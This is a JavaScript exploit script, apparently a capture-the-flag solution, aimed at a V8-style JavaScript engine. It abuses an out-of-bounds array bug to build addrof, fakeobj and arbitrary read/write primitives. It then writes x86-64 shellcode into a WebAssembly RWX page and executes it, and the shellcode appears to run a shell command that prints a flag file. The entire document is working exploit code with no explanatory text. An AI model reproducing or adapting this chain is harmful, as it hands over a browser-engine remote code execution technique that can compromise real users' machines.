const _buf = new ArrayBuffer(8)
const _f64_buf = new Float64Array(_buf)
const _u64_buf = new BigUint64Array(_buf)
const _u32_buf = new Uint32Array(_buf)

Object.defineProperty(BigInt.prototype, 'i2f', {
  get() {
    _u64_buf[0] = this
    return _f64_buf[0]
  }
})
Object.defineProperty(Number.prototype, 'i2f', {
  get() {
    return BigInt(this).i2f
  }
})

Object.defineProperty(Number.prototype, 'f2i', {
  get() {
    _f64_buf[0] = this
    return _u64_buf[0]
  }
})

Object.defineProperty(BigInt.prototype, 'U32', {
  get() {
    _u64_buf[0] = this
    return BigInt(_u32_buf[1])
  }
})
Object.defineProperty(BigInt.prototype, 'L32', {
  get() {
    _u64_buf[0] = this
    return BigInt(_u32_buf[0])
  }
})

Object.defineProperty(BigInt.prototype, 'hex', {
  get() {
   return '0x' + this.toString(16).padStart(16, 0)
  }
})
Object.defineProperty(Number.prototype, 'hex', {
  get() {
   return '0x' + this.toString(16).padStart(8, 0)
  }
})

function oob(size) {
  return {
    get() {
      let value = this[this.length-1+size].f2i
      return value
    },
    set(value) {
      this[this.length-1+size] = value.i2f
      return value
    }
  }
}
Object.defineProperty(Array.prototype, 'map_addr', oob(1))
Object.defineProperty(Array.prototype, 'ele_addr', oob(2))

function create(sz, func) {
  return Array.from(Array.from(Array(sz), func))
}

let tmp_obj = {A:1}
let obj_arr = create(87, () => tmp_obj)
let float_arr = create(87, (v,i) => i+i/10)
let float_map = float_arr.map_addr
let float_ele = float_arr.ele_addr
let obj_map = float_map + 0x50n
let obj_ele = float_ele - 0x1704n

/*
console.log(float_map.hex)
console.log(float_ele.hex)
console.log(obj_map.hex)
console.log(obj_ele.hex)
*/

function addrof(in_obj) {
  float_arr.ele_addr = obj_ele
  obj_arr[0] = obj_arr[1] = obj_arr[2] = in_obj
  let addr = float_arr[0].f2i
  float_arr.ele_addr = float_ele
  return addr
}
function fakeobj(addr) {
  float_arr.ele_addr = obj_ele
  float_arr[0] = addr.i2f
  float_arr.ele_addr = float_ele
  return obj_arr[0]
}

function arb_r(addr) {
  let t = create(87, () => 1.1)
  addr = addr - 0x8n + (87n<<(32n+1n))
  // if (addr % 2n == 0) addr += 1n
  t.ele_addr = addr
  return t[0].f2i
}
function arb_w(addr, val) {
  let t = create(87, () => 1.1)
  addr = addr - 0x8n + (87n<<(32n+1n))
  // if (addr % 2n == 0) addr += 1n
  t.ele_addr = addr
  t[0] = val.i2f
}

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
let wasm_mod = new WebAssembly.Module(wasm_code)
let wasm_instance = new WebAssembly.Instance(wasm_mod)
let wasm_func = wasm_instance.exports.main

let addr_to_read = addrof(wasm_instance).L32 + 0x60n
let rwx = arb_r(addr_to_read)
// console.log('rwx: ' + rwx.hex)

let shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 102, 108, 97, 103, 72, 184, 119, 100, 59, 32, 99, 97, 116, 32, 80, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 44, 98, 1, 104, 101, 58, 33, 113, 72, 49, 4, 36, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 49, 246, 86, 106, 19, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 106, 24, 94, 72, 1, 230, 86, 72, 137, 230, 106, 1, 254, 12, 36, 49, 210, 82, 72, 137, 226, 106, 59, 88, 15, 5, 49, 255, 106, 60, 88, 15, 5]


let buf = new ArrayBuffer(0x100)
let buf_addr = addrof(buf).L32
let backing_addr = buf_addr + 0x1Cn
arb_w(backing_addr, rwx)

let uint8_arr = new Uint8Array(buf)
let uint8_addr = addrof(uint8_arr).L32
let data_ptr_addr = uint8_addr + 0x24n

for (let i = 0; i < shellcode.length; i++)
    uint8_arr[i] = shellcode[i]

wasm_func()
